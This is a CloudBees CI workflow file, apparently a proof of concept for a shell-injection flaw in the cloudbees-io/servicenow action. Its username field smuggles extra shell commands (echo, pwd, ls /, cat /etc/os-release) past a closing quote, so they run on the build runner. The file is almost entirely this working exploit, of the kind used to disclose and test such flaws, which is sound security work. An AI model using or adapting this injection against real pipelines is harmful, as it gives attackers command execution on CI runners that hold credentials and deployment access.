apiVersion: automation.cloudbees.io/v1alpha1
kind: workflow
name: servicenow-shell-injection-poc
on:
  workflow_dispatch:
jobs:
  exploit:
    steps:
      - uses: cloudbees-io/servicenow@v1
        with:
          action-type: 'create_change'
          url: 'https://example.service-now.com'
          username: "x' & echo RCE_WORKS; pwd; ls /; cat /etc/os-release 2>/dev/null || true; :'y"
          password: 'testpass'
          cr-number: '12345'
